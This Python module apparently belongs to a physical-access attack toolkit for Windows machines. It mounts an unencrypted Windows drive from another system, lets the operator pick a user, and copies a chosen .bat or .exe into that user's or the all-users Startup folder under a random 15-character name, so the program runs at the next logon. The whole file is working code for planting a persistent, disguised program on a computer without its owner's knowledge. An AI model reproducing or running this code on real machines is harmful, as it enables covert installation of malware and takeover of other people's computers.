import subprocess
import shutil
import os
import time
import random
def __main__(drive_name,drive_format):
	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
		print("[-] This module does not work with a Bitlocker drive")
	elif drive_name == None:
		print("[-] This module needs a drive to work; use 'usedrive'")
	else:
		if not os.path.exists("tofu_tmp/windows_filesystem"):
			os.mkdir("tofu_tmp/windows_filesystem")
		else:
			try:
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
			except:
				pass
		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
		possible_users = ["SYSTEM"]
		try:
			alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
			users = os.listdir("tofu_tmp/windows_filesystem/Users/")
			for user in users:
				if os.path.exists(f"tofu_tmp/windows_filesystem/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"):

					possible_users.append(user)
			print("[#] Please note that windows does not run SYSTEM startup programs with elevated privileges")
			for possible_user in possible_users:
				print("[USER] " + possible_user)
			user_to_startup = ""
			while user_to_startup not in possible_users:
				user_to_startup = input("[USER] User to run as on startup : ")
				if user_to_startup in possible_users:
					break
				else:
					print("[-] Invalid user")
			program = ""
			while True:
				program = input("[PROGRAM] Program to add : ")
				program = os.path.expanduser(program)
				if not program.endswith(".bat") and not program.endswith(".exe"):
					print("[-] Program must be a '.bat' or '.exe' file")
				elif not os.path.isfile(program):
					print("[-] File does not exist")
				else:
					break

			if user_to_startup != "SYSTEM":
				startup_file = f"tofu_tmp/windows_filesystem/Users/{user_to_startup}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
			else:
				startup_file = f"tofu_tmp/windows_filesystem/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"
			file_name = ""
			for rand in range(15):
				file_name += random.choice(alphanum)
			file_name += "." + program.split(".")[program.count(".")] # File extension
			print(f"File Name : {file_name}")
			shutil.copy(program,startup_file+"/"+file_name)
			print("[+] Done!")
				
		except Exception as open_error:
			print(f"[-] Error {open_error}")
		time.sleep(2)	
		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
